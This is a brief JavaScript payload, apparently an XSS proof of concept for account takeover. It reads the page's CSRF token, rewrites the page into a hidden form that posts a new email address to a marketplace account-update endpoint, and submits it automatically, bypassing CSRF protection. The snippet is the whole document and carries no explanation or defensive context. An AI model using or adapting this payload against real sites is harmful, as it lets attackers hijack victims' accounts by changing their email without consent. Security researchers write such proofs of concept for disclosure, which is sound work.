var csrf =document.querySelector('input[name="_csrf"]').value
document.body.innerHTML="<form action='/marketplace/account/update' method='POST'><input type='hidden' name='email' value='poc4mrxx&#32;ato4poc&#64;gmail&#46;com'/><input type='hidden' name='&#95;csrf' value='"+csrf+"'/><input type='submit' value='Submit request'/></form>"
var form = document.querySelector('form').submit();
